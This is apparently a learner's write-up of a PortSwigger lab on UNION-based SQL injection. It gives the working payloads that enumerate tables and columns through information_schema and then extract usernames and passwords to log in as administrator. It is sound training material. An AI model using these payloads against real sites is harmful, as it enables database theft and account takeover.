## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3cf9ef5a-c9ad-4800-949d-dd81ea9b8e22)

## Solution :

Query made -- 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

## You can list the tables that exist in the database, and the columns that those tables contain in a non-Oracle database.

### List the tables that exist in the database

```sql
SELECT * FROM information_schema.tables
```
### The columns that those tables contain

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
#### Finding out the number of columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/91fd27bc-97c1-4bbb-a82d-9a9316a61b17)

**2 NULL** returns no error , which means there are 2 columns in the database.

####  Finding out which columns contain text data -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'Ananthan','red' --
```
both columns contains text data .

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/812af6a7-26c7-44db-9d2d-95bad1bfe428)


### Database contents-

#### Display the table present in the database-

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM information_schema.tables--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3264a60f-b42b-4bbe-8e32-8287d0000f60)


#### Display the column present in the database-

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_xtnjul'--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f389cc99-a5f5-43fd-a0b0-12ce138e257b)

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f2ff7eeb-59de-4259-811e-98274f44f627)

#### Retreive information from the columns username_wknxhc&password_jodrot from the table users_xtnjul -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username_wknxhc,password_jodrot FROM users_xtnjul--
```
Now we get the username and password of all users.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/08c71d5f-3634-4436-94f6-4f62aab40afc)

Successfully logged in administrator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/49b0ee8c-b50e-49d5-b446-82dc4ffe9689)





